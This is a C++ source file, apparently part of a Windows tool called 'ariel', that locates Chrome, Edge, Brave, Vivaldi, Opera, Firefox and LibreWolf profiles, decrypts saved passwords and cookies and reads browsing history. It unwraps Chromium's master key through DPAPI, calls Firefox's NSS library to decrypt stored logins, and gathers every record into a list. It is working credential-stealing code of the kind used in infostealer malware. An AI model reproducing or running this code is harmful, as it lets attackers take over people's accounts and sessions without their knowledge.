#include "browser.hpp"

#include "crypto.hpp"
#include "util.hpp"

#include <sqlite3.h>
#include <windows.h>

#include <algorithm>
#include <atomic>
#include <fstream>
#include <functional>
#include <memory>
#include <unordered_set>

namespace ariel::browser {

namespace {

std::atomic<uint64_t> g_temp_counter{0};

struct temp_db {
    util::fs::path path;
    sqlite3* handle = nullptr;

    temp_db() = default;
    temp_db(const temp_db&) = delete;
    temp_db& operator=(const temp_db&) = delete;

    ~temp_db() {
        if (handle) sqlite3_close(handle);
        if (!path.empty()) {
            std::error_code error;
            util::fs::remove(path, error);
        }
    }

    bool open(const util::fs::path& source, std::string& error) {
        std::error_code fs_error;
        if (!util::fs::exists(source, fs_error)) {
            error = "missing";
            return false;
        }
        std::wstring directory(MAX_PATH, L'\0');
        const DWORD length = GetTempPathW(static_cast<DWORD>(directory.size()), directory.data());
        if (length == 0 || length > directory.size()) {
            error = "temp path unavailable";
            return false;
        }
        directory.resize(length);
        path = util::fs::path(directory) /
               (L"ariel_" + std::to_wstring(GetCurrentProcessId()) + L"_" +
                std::to_wstring(std::hash<std::wstring>{}(source.wstring())) + L"_" +
                std::to_wstring(g_temp_counter.fetch_add(1)) + L".db");
        if (!CopyFileW(source.c_str(), path.c_str(), FALSE)) {
            error = "copy failed";
            path.clear();
            return false;
        }
        const std::string narrowed = util::narrow_path(path);
        const int rc = sqlite3_open_v2(narrowed.c_str(), &handle, SQLITE_OPEN_READONLY, nullptr);
        if (rc != SQLITE_OK) {
            error = handle ? sqlite3_errmsg(handle) : "open failed";
            if (handle) {
                sqlite3_close(handle);
                handle = nullptr;
            }
            util::fs::remove(path, fs_error);
            path.clear();
            return false;
        }
        return true;
    }
};

std::string column_text(sqlite3_stmt* statement, const int index) {
    const unsigned char* value = sqlite3_column_text(statement, index);
    if (!value) return {};
    return std::string(reinterpret_cast<const char*>(value),
                       static_cast<size_t>(sqlite3_column_bytes(statement, index)));
}

std::vector<uint8_t> column_blob(sqlite3_stmt* statement, const int index) {
    const auto* value = static_cast<const unsigned char*>(sqlite3_column_blob(statement, index));
    const int length = sqlite3_column_bytes(statement, index);
    if (!value || length <= 0) return {};
    return std::vector<uint8_t>(value, value + length);
}

long long column_int64(sqlite3_stmt* statement, const int index) {
    return static_cast<long long>(sqlite3_column_int64(statement, index));
}

std::string history_detail(const long long visits,
                           const long long typed,
                           const long long last,
                           const bool chrome_epoch) {
    long long timestamp = 0;
    if (last > 0) {
        timestamp = last / 1000000;
        if (chrome_epoch) timestamp -= 11644473600LL;
    }
    return "visits: " + std::to_string(visits) + " | typed: " + std::to_string(typed) +
           " | last: " + (timestamp > 0 ? std::to_string(timestamp) : "-");
}

void collect_history(const util::fs::path& database_path,
                     const char* query,
                     const bool chrome_epoch,
                     const std::string& browser_name,
                     const std::string& profile_name,
                     std::vector<record>& out,
                     std::vector<std::string>& warnings) {
    temp_db database;
    std::string error;
    if (!database.open(database_path, error)) {
        if (error != "missing")
            warnings.push_back(browser_name + "/" + profile_name + ": history database " + error);
        return;
    }

    sqlite3_stmt* statement = nullptr;
    if (sqlite3_prepare_v2(database.handle, query, -1, &statement, nullptr) != SQLITE_OK) {
        warnings.push_back(browser_name + "/" + profile_name + ": history query failed");
        return;
    }

    while (sqlite3_step(statement) == SQLITE_ROW) {
        const std::string url = column_text(statement, 0);
        const std::string title = column_text(statement, 1);
        const long long visits = column_int64(statement, 2);
        const long long typed = column_int64(statement, 3);
        const long long last = column_int64(statement, 4);
        out.push_back({browser_name, profile_name, "history", url, title,
                       history_detail(visits, typed, last, chrome_epoch)});
    }
    sqlite3_finalize(statement);
}

struct chromium_target {
    std::string name;
    util::fs::path user_data;
};

std::vector<chromium_target> chromium_targets() {
    const std::wstring local = util::environment(L"LOCALAPPDATA");
    const std::wstring roaming = util::environment(L"APPDATA");
    if (local.empty() || roaming.empty()) return {};
    return {
        {"Chrome", util::fs::path(local) / "Google" / "Chrome" / "User Data"},
        {"Edge", util::fs::path(local) / "Microsoft" / "Edge" / "User Data"},
        {"Brave", util::fs::path(local) / "BraveSoftware" / "Brave-Browser" / "User Data"},
        {"Vivaldi", util::fs::path(local) / "Vivaldi" / "User Data"},
        {"Opera", util::fs::path(roaming) / "Opera Software" / "Opera Stable"},
        {"Chromium", util::fs::path(local) / "Chromium" / "User Data"},
    };
}

std::vector<util::fs::path> browser_profiles(const util::fs::path& root) {
    std::vector<util::fs::path> profiles;
    const auto default_profile = root / "Default";
    if (util::fs::exists(default_profile)) profiles.push_back(default_profile);

    std::error_code error;
    for (auto it = util::fs::directory_iterator(root, error);
         !error && it != util::fs::directory_iterator(); it.increment(error)) {
        if (!it->is_directory(error)) continue;
        const std::wstring name = it->path().filename().wstring();
        if (name.rfind(L"Profile ", 0) == 0 && it->path() != default_profile)
            profiles.push_back(it->path());
    }
    return profiles;
}

std::vector<uint8_t> load_master_key(const util::fs::path& local_state,
                                     std::vector<std::string>& warnings) {
    std::string json;
    if (!util::read_text(local_state, json)) return {};
    const auto encoded = util::json_string(json, "encrypted_key");
    if (!encoded || encoded->empty()) return {};

    auto wrapped = util::base64_decode(*encoded);
    static constexpr char prefix[] = "DPAPI";
    if (wrapped.size() >= sizeof(prefix) - 1 &&
        std::equal(prefix, prefix + sizeof(prefix) - 1, wrapped.begin()))
        wrapped.erase(wrapped.begin(), wrapped.begin() + (sizeof(prefix) - 1));

    std::vector<uint8_t> key;
    if (!crypto::dpapi_unprotect(wrapped, key)) {
        warnings.push_back("Chromium: os_crypt key could not be unwrapped");
        return {};
    }
    return key;
}

void collect_chromium_logins(const util::fs::path& directory,
                             const std::string& browser_name,
                             const std::string& profile_name,
                             const std::vector<uint8_t>& key,
                             std::vector<record>& out,
                             std::vector<std::string>& warnings) {
    temp_db database;
    std::string error;
    if (!database.open(directory / "Login Data", error)) {
        if (error != "missing")
            warnings.push_back(browser_name + "/" + profile_name + ": login database " + error);
        return;
    }

    sqlite3_stmt* statement = nullptr;
    if (sqlite3_prepare_v2(database.handle,
                           "SELECT origin_url, username_value, password_value FROM logins",
                           -1, &statement, nullptr) != SQLITE_OK) {
        warnings.push_back(browser_name + "/" + profile_name + ": login query failed");
        return;
    }

    unsigned app_bound = 0;
    unsigned failures = 0;
    while (sqlite3_step(statement) == SQLITE_ROW) {
        const std::string origin = column_text(statement, 0);
        const std::string username = column_text(statement, 1);
        const auto result = crypto::chromium_decrypt(column_blob(statement, 2), key);
        if (result.status == crypto::decrypt_status::unsupported) {
            ++app_bound;
            continue;
        }
        if (result.status == crypto::decrypt_status::failed) {
            ++failures;
            continue;
        }
        out.push_back({browser_name, profile_name, "password", origin, username,
                       util::printable(result.value)});
    }
    sqlite3_finalize(statement);

    if (app_bound)
        warnings.push_back(browser_name + "/" + profile_name + ": " +
                           std::to_string(app_bound) + " app-bound v20 passwords skipped");
    if (failures)
        warnings.push_back(browser_name + "/" + profile_name + ": " +
                           std::to_string(failures) + " password blobs failed decryption");
}

std::string clean_cookie_value(std::string_view value) {
    size_t first = 0;
    while (first < value.size()) {
        const unsigned char c = static_cast<unsigned char>(value[first]);
        if (c >= 0x20 && c < 0x7f) break;
        ++first;
    }
    if (first == 0) return std::string(value);

    size_t last = first;
    while (last < value.size()) {
        const unsigned char c = static_cast<unsigned char>(value[last]);
        if (c < 0x20 || c >= 0x7f) break;
        ++last;
    }
    if (last - first >= 4) return std::string(value.substr(first));
    return std::string(value);
}

void collect_chromium_cookies(const util::fs::path& directory,
                              const std::string& browser_name,
                              const std::string& profile_name,
                              const std::vector<uint8_t>& key,
                              std::vector<record>& out,
                              std::vector<std::string>& warnings) {
    const util::fs::path candidates[] = {directory / "Cookies", directory / "Network" / "Cookies"};
    for (const auto& candidate : candidates) {
        temp_db database;
        std::string error;
        if (!database.open(candidate, error)) continue;

        sqlite3_stmt* statement = nullptr;
        if (sqlite3_prepare_v2(database.handle,
                               "SELECT host_key, name, value, encrypted_value FROM cookies",
                               -1, &statement, nullptr) != SQLITE_OK) {
            warnings.push_back(browser_name + "/" + profile_name + ": cookie query failed");
            continue;
        }

        unsigned failures = 0;
        unsigned app_bound = 0;
        while (sqlite3_step(statement) == SQLITE_ROW) {
            const std::string host = column_text(statement, 0);
            const std::string cookie_name = column_text(statement, 1);
            const std::string plain_value = column_text(statement, 2);
            const auto encrypted = column_blob(statement, 3);
            std::string secret;
            if (encrypted.empty()) {
                secret = plain_value;
            } else {
                const auto result = crypto::chromium_decrypt(encrypted, key);
                if (result.status == crypto::decrypt_status::unsupported) {
                    ++app_bound;
                    continue;
                }
                if (result.status == crypto::decrypt_status::failed) {
                    ++failures;
                    continue;
                }
                secret = result.value;
            }
            secret = clean_cookie_value(secret);
            out.push_back({browser_name, profile_name, "cookie", host, cookie_name,
                           util::printable(secret)});
        }
        sqlite3_finalize(statement);
        if (app_bound)
            warnings.push_back(browser_name + "/" + profile_name + ": " +
                               std::to_string(app_bound) + " app-bound v20 cookies skipped");
        if (failures)
            warnings.push_back(browser_name + "/" + profile_name + ": " +
                               std::to_string(failures) + " cookie blobs failed decryption");
    }
}

struct sec_item {
    int type;
    unsigned char* data;
    unsigned int len;
};

using nss_init_fn = int (*)(const char*);
using nss_decrypt_fn = int (*)(sec_item*, sec_item*, void*);
using nss_free_fn = void (*)(sec_item*, int);
using nss_shutdown_fn = int (*)();

class nss_engine {
public:
    nss_engine() = default;
    nss_engine(const nss_engine&) = delete;
    nss_engine& operator=(const nss_engine&) = delete;

    ~nss_engine() = default;

    HMODULE library = nullptr;
    nss_init_fn initialize = nullptr;
    nss_decrypt_fn decrypt_fn = nullptr;
    nss_free_fn free_item = nullptr;
    nss_shutdown_fn shutdown = nullptr;

    bool init(const util::fs::path& profile) {
        std::string path = "sql:" + util::narrow_path(profile);
        std::replace(path.begin() + 4, path.end(), '\\', '/');
        if (!initialize || initialize(path.c_str()) != 0) return false;
        active_ = true;
        return true;
    }

    bool decrypt(const std::vector<uint8_t>& blob, std::string& out) {
        if (!decrypt_fn || blob.empty()) return false;
        std::vector<uint8_t> mutable_blob(blob);
        sec_item input{0, mutable_blob.data(), static_cast<unsigned>(mutable_blob.size())};
        sec_item result{0, nullptr, 0};
        if (decrypt_fn(&input, &result, nullptr) != 0) return false;
        if (result.data && result.len > 0)
            out.assign(reinterpret_cast<const char*>(result.data), result.len);
        else
            out.clear();
        return true;
    }

private:
    bool active_ = false;
};

std::unique_ptr<nss_engine> load_nss(std::vector<std::string>& warnings) {
    std::vector<util::fs::path> candidates;
    std::vector<std::wstring> bases;
    for (const wchar_t* name : {L"ProgramFiles", L"ProgramFiles(x86)", L"LOCALAPPDATA"}) {
        const std::wstring value = util::environment(name);
        if (!value.empty()) bases.push_back(value);
    }
    for (const auto& base : bases) {
        candidates.push_back(util::fs::path(base) / "Mozilla Firefox" / "nss3.dll");
        candidates.push_back(util::fs::path(base) / "LibreWolf" / "nss3.dll");
        std::error_code error;
        for (auto it = util::fs::directory_iterator(base, error);
             !error && it != util::fs::directory_iterator(); it.increment(error)) {
            if (!it->is_directory(error)) continue;
            const std::wstring name = it->path().filename().wstring();
            if (name.rfind(L"Mozilla Firefox", 0) == 0 || name.rfind(L"LibreWolf", 0) == 0)
                candidates.push_back(it->path() / "nss3.dll");
        }
    }

    for (const auto& candidate : candidates) {
        if (!util::fs::exists(candidate)) continue;
        HMODULE library = LoadLibraryExW(candidate.c_str(), nullptr, LOAD_WITH_ALTERED_SEARCH_PATH);
        if (!library) continue;
        auto engine = std::make_unique<nss_engine>();
        engine->library = library;
        engine->initialize = reinterpret_cast<nss_init_fn>(GetProcAddress(library, "NSS_Init"));
        engine->decrypt_fn = reinterpret_cast<nss_decrypt_fn>(GetProcAddress(library, "PK11SDR_Decrypt"));
        engine->free_item = reinterpret_cast<nss_free_fn>(GetProcAddress(library, "SECITEM_FreeItem"));
        engine->shutdown = reinterpret_cast<nss_shutdown_fn>(GetProcAddress(library, "NSS_Shutdown"));
        if (!engine->initialize || !engine->decrypt_fn || !engine->free_item || !engine->shutdown) {
            warnings.push_back("Firefox: nss3.dll exports are incomplete");
            return nullptr;
        }
        return engine;
    }
    warnings.push_back("Firefox: nss3.dll not found");
    return nullptr;
}

std::vector<util::fs::path> profiles_from_ini(const util::fs::path& ini) {
    std::ifstream file(ini);
    if (!file) return {};

    std::vector<util::fs::path> profiles;
    bool in_profile = false;
    std::string path_value;
    std::string relative = "1";

    const auto flush = [&]() {
        if (!in_profile || path_value.empty()) return;
        const util::fs::path raw = util::from_utf8(path_value);
        const util::fs::path resolved = relative == "1" ? ini.parent_path() / raw : raw;
        if (util::fs::exists(resolved)) profiles.push_back(resolved);
    };

    std::string line;
    while (std::getline(file, line)) {
        line = util::trim(line);
        if (line.empty() || line.front() == '#' || line.front() == ';') continue;
        if (line.front() == '[' && line.back() == ']') {
            flush();
            const std::string section = line.substr(1, line.size() - 2);
            in_profile = section.rfind("Profile", 0) == 0;
            path_value.clear();
            relative = "1";
            continue;
        }
        if (!in_profile) continue;
        const size_t equals = line.find('=');
        if (equals == std::string::npos) continue;
        const std::string key = util::trim(line.substr(0, equals));
        const std::string value = util::trim(line.substr(equals + 1));
        if (key == "Path") path_value = value;
        else if (key == "IsRelative") relative = value;
    }
    flush();
    return profiles;
}

std::vector<util::fs::path> firefox_profiles() {
    const util::fs::path appdata = util::environment(L"APPDATA");
    const std::vector<util::fs::path> inis = {
        appdata / "Mozilla" / "Firefox" / "profiles.ini",
        appdata / "LibreWolf" / "profiles.ini",
        appdata / "LibreWolf" / "Profiles" / "profiles.ini",
    };

    std::vector<util::fs::path> profiles;
    std::unordered_set<std::string> seen;
    for (const auto& ini : inis) {
        for (const auto& profile : profiles_from_ini(ini)) {
            const std::string key = util::lower(util::narrow_path(profile));
            if (!seen.insert(key).second) continue;
            profiles.push_back(profile);
        }
    }
    return profiles;
}

std::string firefox_browser_name(const util::fs::path& profile) {
    const std::string path = util::lower(util::narrow_path(profile));
    return path.find("librewolf") == std::string::npos ? "Firefox" : "LibreWolf";
}

std::string decrypt_or_raw(const std::vector<uint8_t>& blob,
                           const std::string& fallback,
                           nss_engine& engine) {
    std::string plain;
    if (!blob.empty() && engine.decrypt(blob, plain)) return plain;
    return fallback;
}

void collect_firefox_logins(const util::fs::path& profile,
                            const std::string& browser_name,
                            const std::string& profile_name,
                            nss_engine& engine,
                            std::vector<record>& out) {
    std::string json;
    if (!util::read_text(profile / "logins.json", json)) return;
    const auto logins = util::json_raw(json, "logins");
    if (!logins) return;

    for (const auto object : util::json_objects(*logins)) {
        const std::string hostname = util::json_string(object, "hostname").value_or("");
        const std::string encrypted_user = util::json_string(object, "encryptedUsername").value_or("");
        const std::string encrypted_password = util::json_string(object, "encryptedPassword").value_or("");
        out.push_back({browser_name, profile_name, "password", hostname,
                       decrypt_or_raw(util::base64_decode(encrypted_user), encrypted_user, engine),
                       decrypt_or_raw(util::base64_decode(encrypted_password), encrypted_password,
                                      engine)});
    }
}

void collect_firefox_cookies(const util::fs::path& profile,
                             const std::string& browser_name,
                             const std::string& profile_name,
                             nss_engine& engine,
                             std::vector<record>& out,
                             std::vector<std::string>& warnings) {
    temp_db database;
    std::string error;
    if (!database.open(profile / "cookies.sqlite", error)) {
        if (error != "missing")
            warnings.push_back(browser_name + "/" + profile_name + ": cookie database " + error);
        return;
    }

    sqlite3_stmt* statement = nullptr;
    if (sqlite3_prepare_v2(database.handle,
                           "SELECT host, name, value FROM moz_cookies",
                           -1, &statement, nullptr) != SQLITE_OK) {
        warnings.push_back(browser_name + "/" + profile_name + ": cookie query failed");
        return;
    }

    while (sqlite3_step(statement) == SQLITE_ROW) {
        const std::string host = column_text(statement, 0);
        const std::string cookie_name = column_text(statement, 1);
        const std::string secret = column_text(statement, 2);
        out.push_back({browser_name, profile_name, "cookie", host, cookie_name, secret});
    }
    sqlite3_finalize(statement);
}

}  // namespace

void collect_chromium_into(std::vector<record>& out, std::vector<std::string>& warnings) {
    for (const auto& target : chromium_targets()) {
        std::error_code error;
        if (!util::fs::exists(target.user_data, error)) continue;
        warnings.push_back("Chromium: scanning " + target.name);
        const auto key = load_master_key(target.user_data / "Local State", warnings);
        for (const auto& profile : browser_profiles(target.user_data)) {
            warnings.push_back("Chromium: profile " + target.name + "/" +
                               util::narrow_path(profile.filename()));
            const std::string profile_name = util::narrow_path(profile.filename());
            collect_chromium_logins(profile, target.name, profile_name, key, out, warnings);
            collect_chromium_cookies(profile, target.name, profile_name, key, out, warnings);
            collect_history(profile / "History",
                            "SELECT url, title, visit_count, typed_count, last_visit_time "
                            "FROM urls ORDER BY last_visit_time DESC",
                            true, target.name, profile_name, out, warnings);
        }
    }
}

std::vector<record> collect_chromium(std::vector<std::string>& warnings) {
    std::vector<record> out;
    collect_chromium_into(out, warnings);
    return out;
}

void collect_firefox_into(std::vector<record>& out, std::vector<std::string>& warnings) {
    const auto profiles = firefox_profiles();
    if (profiles.empty()) return;

    auto engine = load_nss(warnings);
    if (!engine) return;

    for (const auto& profile : profiles) {
        const std::string browser_name = firefox_browser_name(profile);
        warnings.push_back(browser_name + ": scanning " + util::narrow_path(profile));
        if (!engine->init(profile)) {
            warnings.push_back(browser_name + ": NSS init failed for " + util::narrow_path(profile));
            continue;
        }
        warnings.push_back(browser_name + ": NSS init ok for " + util::narrow_path(profile));
        const std::string profile_name = util::narrow_path(profile.filename());
        warnings.push_back(browser_name + ": reading logins for " + profile_name);
        collect_firefox_logins(profile, browser_name, profile_name, *engine, out);
        warnings.push_back(browser_name + ": reading cookies for " + profile_name);
        collect_firefox_cookies(profile, browser_name, profile_name, *engine, out, warnings);
        warnings.push_back(browser_name + ": reading history for " + profile_name);
        collect_history(profile / "places.sqlite",
                        "SELECT url, title, COALESCE(visit_count, 0), COALESCE(typed_count, 0), "
                        "COALESCE(last_visit_date, 0) FROM moz_places ORDER BY last_visit_date DESC",
                        false, browser_name, profile_name, out, warnings);
        warnings.push_back(browser_name + ": done with " + profile_name);
    }
}

std::vector<record> collect_firefox(std::vector<std::string>& warnings) {
    std::vector<record> out;
    collect_firefox_into(out, warnings);
    return out;
}

std::vector<util::fs::path> storage_paths() {
    std::vector<util::fs::path> paths;
    for (const auto& target : chromium_targets()) {
        for (const auto& profile : browser_profiles(target.user_data)) {
            const auto leveldb = profile / "Local Storage" / "leveldb";
            if (util::fs::exists(leveldb)) paths.push_back(leveldb);
        }
    }
    for (const auto& profile : firefox_profiles()) {
        const auto store = profile / "webappsstore.sqlite";
        if (util::fs::exists(store)) paths.push_back(store);
    }
    return paths;
}

}  // namespace ariel::browser
